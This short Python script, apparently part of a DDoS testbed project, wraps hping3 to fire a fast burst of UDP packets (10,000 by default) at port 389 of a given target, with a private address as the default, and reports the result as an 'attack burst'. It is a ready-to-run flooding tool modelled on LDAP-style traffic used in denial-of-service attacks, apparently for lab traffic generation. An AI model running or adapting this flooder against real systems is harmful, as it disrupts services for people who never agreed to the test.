#!/home/deep/files/arf_ddos/venv/bin/python
import argparse
import subprocess

DEFAULT_TARGET = '10.0.0.1'


def main():
	parser = argparse.ArgumentParser(description='Send a bounded LDAP UDP burst with hping3.')
	parser.add_argument('target', nargs='?', default=DEFAULT_TARGET)
	parser.add_argument('--count', type=int, default=10000)
	args = parser.parse_args()
	if args.count < 1:
		parser.error('count must be positive')
	print(f'[LDAP] sending {args.count} UDP packets to {args.target}:389', flush=True)
	try:
		result = subprocess.run(
			['hping3', '-2', '-c', str(args.count), '--fast', '-p', '389', args.target],
			check=False,
		)
	except FileNotFoundError:
		parser.error('hping3 is not installed; install it with: sudo apt-get install hping3')
	if result.returncode == 0:
		print('[LDAP] attack burst complete', flush=True)
	else:
		print(f'[LDAP] hping3 exited with status {result.returncode}', flush=True)


if __name__ == '__main__':
	main()
